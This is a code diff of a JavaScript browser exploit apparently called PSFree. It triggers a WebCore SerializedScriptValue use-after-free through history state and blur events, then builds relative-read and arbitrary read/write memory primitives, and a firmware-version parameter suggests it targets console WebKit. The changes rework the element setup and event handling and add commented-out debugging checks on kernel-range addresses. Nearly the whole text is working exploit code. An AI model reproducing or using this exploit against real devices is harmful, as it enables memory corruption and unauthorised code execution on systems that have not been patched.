@@ -129,15 +129,6 @@ function prepare_uaf() {
     return [fsets, indices];
 }
 
-
- var input = document.createElement('input');
- input.style.position = 'absolute';
- input.style.top = '-100px';
- document.body.append(input);
- var foo = document.createElement('a');
- foo.id = 'foo';
- document.body.append(foo);
-
 // WebCore::SerializedScriptValue use-after-free
 //
 // be careful when accessing history.state since History::state() will get
@@ -145,6 +136,13 @@ function prepare_uaf() {
 // do. that field is a RefPtr, thus preventing a UaF if we cache "state1"
 async function uaf_ssv(fsets, index, save_pop=false) {
     const views = [];
+    const input = document.createElement('input');
+    input.style.position = 'absolute';
+    input.style.top = '-100px';
+    const foo = document.createElement('a');
+    foo.id = 'foo';
+    foo.style.position = 'absolute';
+    foo.style.top = '-100px';
 
     // debug_log(`ssv_len: ${hex(ssv_len)}`);
 
@@ -190,8 +188,10 @@ async function uaf_ssv(fsets, index, save_pop=false) {
 
         num_blurs++;
     }
-    
-    input.onblur = onblur;
+    input.addEventListener('blur', onblur);
+
+    document.body.append(input);
+    document.body.append(foo);
 
     // FrameLoader::loadInSameDocument() calls Document::statePopped().
     // statePopped() will defer firing of popstate until we're in the complete
@@ -221,7 +221,7 @@ async function uaf_ssv(fsets, index, save_pop=false) {
 
     history.back();
     await pop_promise;
-    input.onblur = null;
+    input.removeEventListener('blur', onblur);
 
     // debug_log('done await popstate');
 
@@ -230,6 +230,10 @@ async function uaf_ssv(fsets, index, save_pop=false) {
             // debug_log(`view index: ${hex(i)}`);
             // debug_log('found view:');
             // debug_log(view);
+
+            input.remove();
+            foo.remove();
+
             // set SSV's refcount to 1, all other fields to 0/NULL
             view[0] = 1;
             view.fill(0, 1);
@@ -703,7 +707,6 @@ async function make_arw(reader, view2, pop) {
 
 window.run_psfree = async function(target) {
     // if target is a string formatted like "4.03" then convert to 0x10403
-    StartTimer();
     if (typeof target === 'string') {
         target = parseInt(target.replace('.', ''), 16) | 0x10000;
     }
@@ -799,10 +802,10 @@ window.run_psfree = async function(target) {
     debug_log('PSFree: UaF SSV');
     const [fsets, indices] = prepare_uaf()
     const view = await uaf_ssv(fsets, indices[1]);
-
+    
     debug_log('PSFree: get string relative read primitive');
     const rdr = await make_rdr(view);
-
+    
     // make view2 now as to prevent earlier StringImpls from getting allocated
     // near it. that slows down the loop at make_arw() since it prevents the
     // the m_constantRegisters allocation from reusing the memory near view2.
@@ -816,6 +819,19 @@ window.run_psfree = async function(target) {
 
     debug_log('PSFree: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
+
+    // /**
+    //  * @param {int64} addr 
+    //  */
+    // function alertBacktraceIfNonUserspaceAddress(addr) {
+    //     if (((addr.hi & 0xffff8000) >>> 0) === 0xffff8000) {
+    //         try {
+    //             throw new Error();
+    //         } catch (error) {
+    //             alert(`Tried to write to an invalid userspace address: 0x${addr.toString(16)}\n${error.stack}`);
+    //         }
+    //     }
+    // }
 
     let prim = {
         read1(addr) {
@@ -843,21 +859,25 @@ window.run_psfree = async function(target) {
         },
 
         write1(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             mem.write8(addr, value);
         },
-
+        
         write2(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             mem.write16(addr, value);
         },
-
+        
         write4(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             mem.write32(addr, value);
         },
-
+        
         write8(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             if (value instanceof int64) {
                 value = new Int(value.low, value.hi);
